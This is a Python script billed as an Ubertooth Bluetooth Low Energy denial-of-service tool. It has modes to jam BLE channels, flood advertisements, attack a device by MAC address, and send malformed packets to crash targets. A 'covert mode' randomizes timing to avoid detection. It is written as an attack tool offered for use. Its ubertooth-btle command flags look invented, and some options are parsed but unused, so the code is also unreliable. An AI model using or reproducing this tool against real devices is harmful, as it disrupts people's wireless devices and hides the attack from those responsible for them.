import argparse
import subprocess
import time
import json
import os
import random

"""
Ubertooth BLE DoS Attack Tool

Features:
    - Performs denial-of-service (DoS) attacks against BLE devices by flooding connections.
    - Jams BLE channels to prevent new connections.
    - Sends malformed BLE packets to crash or freeze target devices.
    - Targets specific devices or entire BLE frequency ranges.
    - Logs attack results for forensic analysis.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle
    - Optional: hcitool & btmgmt for additional BLE manipulation.

Usage:
    - Perform a BLE DoS attack against all BLE devices in range:
      python ubertooth_ble_dos.py --jam
    - Target a specific BLE device by MAC address for DoS attack:
      python ubertooth_ble_dos.py --target AA:BB:CC:DD:EE:FF --attack
    - Flood BLE advertisement channels to prevent connections:
      python ubertooth_ble_dos.py --flood
    - Send malformed BLE packets to crash or freeze a target device:
      python ubertooth_ble_dos.py --target AA:BB:CC:DD:EE:FF --malformed
    - Log all attack attempts for forensic analysis:
      python ubertooth_ble_dos.py --log ble_dos_log.json
    - Enable Covert Mode (randomized attack intervals to avoid detection):
      python ubertooth_ble_dos.py --attack --covert
"""

LOG_FILE = "ble_dos_log.json"

def log_event(event_data):
    """Logs BLE DoS attack attempts."""
    try:
        logs = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)

        logs.append(event_data)

        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=4)

    except Exception as e:
        print(f"[ERROR] Failed to log BLE DoS event: {e}")

def jam_ble_channels(covert=False):
    """Jams BLE communication channels to disrupt all nearby devices."""
    print("[INFO] Jamming BLE channels to prevent communication...")

    try:
        if covert:
            delay = random.uniform(2.0, 5.0)
            print(f"[COVERT MODE] Delaying jamming attack by {delay:.2f} seconds...")
            time.sleep(delay)

        subprocess.run(["ubertooth-btle", "--jam"])
        log_event({"timestamp": time.time(), "action": "BLE Channel Jamming"})

    except Exception as e:
        print(f"[ERROR] Failed to jam BLE channels: {e}")

def flood_ble_advertisements(covert=False):
    """Floods BLE advertisement channels to prevent new connections."""
    print("[INFO] Flooding BLE advertisement channels...")

    try:
        if covert:
            delay = random.uniform(2.0, 5.0)
            print(f"[COVERT MODE] Delaying advertisement flood attack by {delay:.2f} seconds...")
            time.sleep(delay)

        subprocess.run(["ubertooth-btle", "--flood"])
        log_event({"timestamp": time.time(), "action": "BLE Advertisement Flooding"})

    except Exception as e:
        print(f"[ERROR] Failed to flood BLE advertisements: {e}")

def attack_ble_device(target_mac, covert=False):
    """Performs a BLE DoS attack against a specific BLE device."""
    print(f"[INFO] Attacking BLE device {target_mac}...")

    try:
        if covert:
            delay = random.uniform(2.0, 6.0)
            print(f"[COVERT MODE] Delaying attack by {delay:.2f} seconds...")
            time.sleep(delay)

        subprocess.run(["ubertooth-btle", "-t", target_mac, "--attack"])
        log_event({"timestamp": time.time(), "target": target_mac, "action": "BLE DoS Attack"})

    except Exception as e:
        print(f"[ERROR] Failed to attack BLE device: {e}")

def send_malformed_packets(target_mac, covert=False):
    """Sends malformed BLE packets to crash or freeze a target device."""
    print(f"[INFO] Sending malformed BLE packets to {target_mac}...")

    try:
        if covert:
            delay = random.uniform(3.0, 7.0)
            print(f"[COVERT MODE] Delaying malformed packet attack by {delay:.2f} seconds...")
            time.sleep(delay)

        subprocess.run(["ubertooth-btle", "-t", target_mac, "--malformed"])
        log_event({"timestamp": time.time(), "target": target_mac, "action": "Malformed BLE Packet Attack"})

    except Exception as e:
        print(f"[ERROR] Failed to send malformed BLE packets: {e}")

def automated_ble_dos(covert=False):
    """Runs an automated BLE DoS attack sequence."""
    print("[INFO] Running automated BLE DoS attack...")

    jam_ble_channels(covert)
    flood_ble_advertisements(covert)

    print("[SUCCESS] Automated BLE DoS attack sequence completed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth BLE DoS Attack")
    parser.add_argument("--jam", action="store_true", help="Jam BLE communication channels")
    parser.add_argument("--flood", action="store_true", help="Flood BLE advertisement channels")
    parser.add_argument("--target", type=str, help="Specify target BLE MAC address")
    parser.add_argument("--attack", action="store_true", help="Perform BLE DoS attack on a specific device")
    parser.add_argument("--malformed", action="store_true", help="Send malformed BLE packets to crash or freeze a device")
    parser.add_argument("--covert", action="store_true", help="Enable covert mode with randomized attack intervals")
    parser.add_argument("--log", type=str, help="Log detected vulnerabilities & successful attacks")

    args = parser.parse_args()

    if args.jam:
        jam_ble_channels(covert=args.covert)
    elif args.flood:
        flood_ble_advertisements(covert=args.covert)
    elif args.attack and args.target:
        attack_ble_device(args.target, covert=args.covert)
    elif args.malformed and args.target:
        send_malformed_packets(args.target, covert=args.covert)
    else:
        print("[ERROR] No valid mode selected!")
